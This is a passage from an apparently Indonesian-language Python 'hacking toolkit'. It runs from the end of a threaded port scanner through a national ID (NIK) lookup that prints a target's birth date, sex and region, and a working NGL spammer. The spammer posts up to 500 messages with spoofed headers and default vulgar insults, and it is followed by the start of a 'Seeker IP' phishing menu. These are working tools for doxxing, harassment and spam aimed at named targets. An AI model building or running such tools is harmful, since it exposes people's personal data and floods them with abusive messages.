                results.append((port, service, "OPEN"))
            else:
                results.append((port, "Unknown", "CLOSED"))
        except:
            results.append((port, "Unknown", "ERROR"))
    
    print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {Y}Scanning {len(ports)} Port...{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────╯")
    
    stop_loading = threading.Event()
    loading_thread = threading.Thread(target=load_bar, args=(stop_loading,))
    loading_thread.daemon = True
    loading_thread.start()
    
    results = []
    threads = []
    
    for port in ports:
        t = threading.Thread(target=scan_port, args=(port, results))
        t.daemon = True
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    stop_loading.set()
    loading_thread.join()
    
    print(f"\r [ {G}✓{W} ] Scan Selesai!                     ")
    
    open_ports = [r for r in results if r[2] == "OPEN"]
    closed_ports = [r for r in results if r[2] == "CLOSED"]
    error_ports = [r for r in results if r[2] == "ERROR"]
    
    print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {G}✓{W} Hasil Scan Port {C}{ip_target}{N}")
    print(f"{W}├─────────────────────────────────────────────────────────────┤")
    print(f"{W}│ {C}Total Port   {W}: {G}{len(results)}{N}")
    print(f"{W}│ {C}Port Terbuka{W}: {G}{len(open_ports)}{N}")
    print(f"{W}│ {C}Port Tertutup{W}: {Y}{len(closed_ports)}{N}")
    print(f"{W}│ {C}Port Error  {W}: {R}{len(error_ports)}{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────╯")
    
    if open_ports:
        print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {G}Port Terbuka:{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────┤")
        for port, service, status in open_ports:
            print(f"{W}│ {C}{port:>6}{W} | {G}{service:<15}{W} | {G}{status}{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────╯")
    
    if closed_ports:
        print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {Y}Port Tertutup:{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────┤")
        for port, service, status in closed_ports:
            print(f"{W}│ {C}{port:>6}{W} | {Y}{service:<15}{W} | {Y}{status}{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────╯")
    
    if error_ports:
        print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {R}Port Error:{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────┤")
        for port, service, status in error_ports:
            print(f"{W}│ {C}{port:>6}{W} | {R}{service:<15}{W} | {R}{status}{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────╯")
    
    input(f"\n{Y}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_nik_checker():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, json, requests, threading
    
    os.system('clear')
    
    R = '\033[91m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    G = '\033[92m'
    N = '\033[0m'
    
    ascii_nik = """
⠐⠒⠶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⡶⠖⠂
⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⣧⠀⡀⢰⡆⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣄⣀⣀⠀⣠⣿⣿⣿⣿⣇⡀⣀⣀⣀⣤⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_nik}" | lolcat')
    print(f"""
{W}╭──────────────────────────────────────────────────────────────╮
{W}│ {W}Developer {W}:{G} Rullzzz06,{W} Tools {W}:{G}Checker NIK
{W}╰──────────────────────────────────────────────────────────────╯{N}""")
    print(f"{W}╭──────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Masukkan {G}NIK{W} (16 digit){N}")
    print(f"{W}│ Contoh {G}:{W} 3307110101990001{N}")
    print(f"{W}╰──────────────────────────────────────────────────────────────╯{N}")
    
    nik = input(f"\n{U}❯❯❯{W} Masukkan Nik target{G}❯{W} ").strip()
    
    if not nik:
        print(f"\n{G}[!]{W} Nik tidak Boleh kosong! Tekan {R}Enter{W} Untuk Kembali")
        input()
        return
    
    if not nik.isdigit() or len(nik) != 16:
        print(f"\n{R}✗{W} NIK harus {G}16{W} digit angka!{N}")
        time.sleep(2)
        return
    
    print(f"\n{G}✓ NIK: {C}{nik}{N}")
    
    def load_bar(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Sedang Mengecek NIK [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    stop_loading = threading.Event()
    loading_thread = threading.Thread(target=load_bar, args=(stop_loading,))
    loading_thread.daemon = True
    loading_thread.start()
    
    time.sleep(1.5)
    
    try:
        url = f"https://api.nexray.eu.cc/tools/nikparse?nik={nik}"
        response = requests.get(url, timeout=10)
        stop_loading.set()
        loading_thread.join()
        
        if response.status_code == 200:
            data = response.json()
            
            print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {G}✓{W} NIK Berhasil Ditemukan!{N}")
            print(f"{W}├─────────────────────────────────────────────────────────────┤")
            
            if 'result' in data and isinstance(data['result'], dict):
                result = data['result']
                
                if 'nik' in result:
                    print(f"{W}│ {C}NIK            {W}: {G}{result['nik']}{N}")
                if 'kelamin' in result:
                    print(f"{W}│ {C}Jenis Kelamin  {W}: {G}{result['kelamin']}{N}")
                if 'lahir' in result:
                    print(f"{W}│ {C}Tanggal Lahir  {W}: {G}{result['lahir']}{N}")
                if 'lahir_lengkap' in result:
                    print(f"{W}│ {C}Tgl Lahir     {W}: {G}{result['lahir_lengkap']}{N}")
                
                if 'provinsi' in result and isinstance(result['provinsi'], dict):
                    prov = result['provinsi']
                    if 'nama' in prov:
                        print(f"{W}│ {C}Provinsi       {W}: {G}{prov['nama']}{N}")
                
                if 'kotakab' in result and isinstance(result['kotakab'], dict):
                    kota = result['kotakab']
                    if 'nama' in kota:
                        print(f"{W}│ {C}Kab/Kota       {W}: {G}{kota['nama']}{N}")
                
                if 'kecamatan' in result and isinstance(result['kecamatan'], dict):
                    kec = result['kecamatan']
                    if 'nama' in kec:
                        print(f"{W}│ {C}Kecamatan      {W}: {G}{kec['nama']}{N}")
                
                if 'kode_wilayah' in result:
                    print(f"{W}│ {C}Kode Wilayah   {W}: {G}{result['kode_wilayah']}{N}")
                if 'nomor_urut' in result:
                    print(f"{W}│ {C}Nomor Urut     {W}: {G}{result['nomor_urut']}{N}")
                
                if 'tambahan' in result and isinstance(result['tambahan'], dict):
                    tambah = result['tambahan']
                    if 'pasaran' in tambah:
                        print(f"{W}│ {C}Pasaran        {W}: {G}{tambah['pasaran']}{N}")
                    if 'usia' in tambah:
                        print(f"{W}│ {C}Usia           {W}: {G}{tambah['usia']}{N}")
                    if 'kategori_usia' in tambah:
                        print(f"{W}│ {C}Kategori Usia  {W}: {G}{tambah['kategori_usia']}{N}")
                    if 'ultah' in tambah:
                        print(f"{W}│ {C}Ultah Lagi     {W}: {G}{tambah['ultah']}{N}")
                    if 'zodiak' in tambah:
                        print(f"{W}│ {C}Zodiak         {W}: {G}{tambah['zodiak']}{N}")
            
            print(f"{W}╰─────────────────────────────────────────────────────────────╯")
            
        else:
            stop_loading.set()
            loading_thread.join()
            print(f"\n{R}✗ Gagal mengecek NIK! Status: {response.status_code}{N}")
            
    except requests.exceptions.Timeout:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Timeout! Server tidak merespons.{N}")
    except requests.exceptions.ConnectionError:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Gagal terhubung ke server!{N}")
    except Exception as e:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Error: {e}{N}")
    
    input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_spam_NGL():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, json, requests, threading, random, uuid
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    W = '\033[97m'
    N = '\033[0m'
    
    ascii_ngl = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣶⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⣴⣶⣶⣶⣶⣦⣄⠀⠀⣾⣿⣿⣿⣿⣶⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⢠⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀
⠀⢰⣿⣿⣿⣿⣿⣿⣿⠀⢠⣿⣿⣿⣿⣿⡟⠀⠀⣰⣿⣿⣿⣿⣿⣿⠟⢿⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀
⠀⣸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⠇⠀⢠⣿⣿⣿⣿⣿⣿⠃⠀⠀⣿⣿⣿⡿⠿⠃⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿⣿⣿⣿⡿⠀⣀⣀⣠⣤⣤⣤⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⢠⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⡀⠀⢸⣿⣿⣿⣿⣿⣿⣤⣤⣴⣶⡄⠀
⢸⣿⣿⣿⣿⣿⠘⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣤⣠⣴⣿⣿⣿⣿⣿⠇⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⢸⣿⣿⣿⣿⡿⠀⢻⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⣾⣿⣿⣿⣿⡇⠀⠘⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠙⠿⠿⠿⠛⠛⠉⠉⠁⠀
⠹⣿⣿⣿⣿⡇⠀⠀⠘⠿⠿⠿⠿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_ngl}" | lolcat 2>/dev/null || echo "{ascii_ngl}"')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Developer {W}:{G} Rullzzz06,{W} Tools {W}:{G}NGL Spammer
{W}╰─────────────────────────────────────────────────────────────────╯{N}""")
    print(f"{W}╭─────────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Masukkan {G}Username NGL{W} target (tanpa @){N}")
    print(f"{W}│ Contoh {G}:{W} jokowi  atau  username_target{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    
    username = input(f"{U}❯❯❯ {W}Masukkan Username{G}❯{W} ").strip()
    
    if not username:
        print(f"\n{R}✗ Username tidak boleh kosong!{N}")
        input(f"\n{W}Tekan Enter untuk kembali...{N}")
        return
    
    def load_bar_check(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Mengecek Username NGL [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    def cek_username(username):
        try:
            url = f"https://ngl.link/{username}"
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200 and "not found" not in resp.text.lower():
                return True
            return False
        except:
            return False
    
    stop_check = threading.Event()
    check_thread = threading.Thread(target=load_bar_check, args=(stop_check,))
    check_thread.daemon = True
    check_thread.start()
    
    time.sleep(1.5)
    valid = cek_username(username)
    stop_check.set()
    check_thread.join()
    
    if not valid:
        print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {R}✗{W} Username {R}{username}{W} tidak ditemukan!{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────╯")
        input(f"\n{W}Tekan Enter untuk kembali...{N}")
        return
    
    print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {G}✓{W} Username {G}{username}{W} ditemukan!{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────╯")
    
    print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
    print(f"{W}│ [ {G}1{W} ] Pakai pesan default: {W}Ngentod Asuu Memek{N}")
    print(f"{W}│ [ {G}2{W} ] Masukkan pesan sendiri{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────╯")
    
    pilihan_pesan = input(f"{W}╰──{G}❯{W} ").strip()
    
    if pilihan_pesan == "2":
        print(f"{W}╭─────────────────────────────────────────────────────────────╮")
        print(f"{W}│ Masukkan {G}pesan{W} yang mau dikirim{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────╯")
        pesan = input(f"{W}╰──{G}❯{W} ").strip()
        if not pesan:
            pesan = "Ngentod Asuu Memek"
            print(f"{W}[!] Pesan kosong, pakai default{N}")
    else:
        pesan = "Ngentod Asuu Memek, Bapak lu yatim"
        print(f"{G}✓ Pakai pesan default{N}")
    
    print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
    print(f"{W}│ Masukkan {G}jumlah{W} spam (max 500 per sesi){N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────╯")
    
    try:
        jumlah = int(input(f"{W}╰──{G}❯{W} ").strip())
        if jumlah < 1:
            jumlah = 10
            print(f"{W}[!] Minimal 1, pakai 10{N}")
        elif jumlah > 500:
            jumlah = 500
            print(f"{W}[!] Maksimal 500{N}")
    except:
        jumlah = 10
        print(f"{W}[!] Input tidak valid, pakai 10{N}")
    
    print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {W}Target    {W}: {G}{username}{N}")
    print(f"{W}│ {W}Pesan     {W}: {G}{pesan[:30]}{'...' if len(pesan) > 30 else ''}{N}")
    print(f"{W}│ {W}Jumlah    {W}: {G}{jumlah}{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────╯")
    
    confirm = input(f"\n{W}Mulai spam? (y/n): {N}").strip().lower()
    if confirm != 'y':
        print(f"\n{W}[!] Dibatalkan{N}")
        input(f"\n{W}Tekan Enter untuk kembali...{N}")
        return
    
    def kirim_ngl(username, pesan):
        try:
            url = "https://ngl.link/api/submit"
            payload = {
                "username": username,
                "question": pesan,
                "deviceId": str(uuid.uuid4())
            }
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://ngl.link",
                "Referer": f"https://ngl.link/{username}"
            }
            resp = requests.post(url, json=payload, headers=headers, timeout=10)
            return resp.status_code == 200
        except:
            return False
    
    def load_bar_spam(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Mengirim Spam NGL [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    stop_loading = threading.Event()
    loading_thread = threading.Thread(target=load_bar_spam, args=(stop_loading,))
    loading_thread.daemon = True
    loading_thread.start()
    
    time.sleep(1)
    
    berhasil = 0
    gagal = 0
    
    for i in range(jumlah):
        status = kirim_ngl(username, pesan)
        if status:
            berhasil += 1
        else:
            gagal += 1
        time.sleep(0.3)
    
    stop_loading.set()
    loading_thread.join()
    
    print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {G}✓{W} Spam NGL Selesai!{N}")
    print(f"{W}├─────────────────────────────────────────────────────────────┤")
    print(f"{W}│ {W}Target    {W}: {G}{username}{N}")
    print(f"{W}│ {W}Berhasil  {W}: {G}{berhasil}{N}")
    print(f"{W}│ {W}Gagal     {W}: {R}{gagal}{N}")
    print(f"{W}│ {W}Total     {W}: {G}{berhasil + gagal}{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────╯")
    
    input(f"\n{W}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_Phissing():
   try:
    play_menu_sound()
    os.system('clear')
    G = '\033[1;32m'
    W = '\033[1;37m'
    Y = '\033[1;33m'
    R = '\033[1;31m'
    C = '\033[1;36m'
    P = '\033[1;35m'
    N = '\033[0m'
    ascii_Seeker = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣴⣦⣈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⣁⣤⣦⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣈⣈⣉⣉⣉⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⡿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⣠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣷⠀⠀⠀⠈⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠉⠀⠀⠀⠀⣺⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣆⠀⠀⠀⠀⠈⣿⣶⣶⣾⣿⣿⣿⣿⣶⣶⣶⣿⠅⠀⠀⠀⠀⣰⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣧⡀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⢀⣼⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⣿⣿⣦⡀⠀⠀⠀⠉⠛⠿⣿⣿⠿⠛⠉⠀⠀⠀⢀⣴⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠾⠿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⠿⠗⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣆⠀⠀⣰⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⠀⠀⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠹⠇⢸⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_Seeker}" | lolcat')
    print(f"""
{W}╭─────────────────────────────────────────────────────────────╮
{W}│  {W}Author : {G}Rulzz06
{W}│  {W}Tools  : {G}Seeker IP
{W}╰─────────────────────────────────────────────────────────────╯
{W}╭─────────────────────────────────────────────────────────────╮
{W}│  {W}[ {G}1{W} ] Memulai Seeker
{W}│  {W}[ {R}0{W} ] Kembali
{W}╰─────────────────────────────────────────────────────────────╯{N}""")
    pilihan = input(f"{U}❯❯❯{W} Pilih Menu{R}❯{N} ").strip()
    if pilihan == "0":
        return
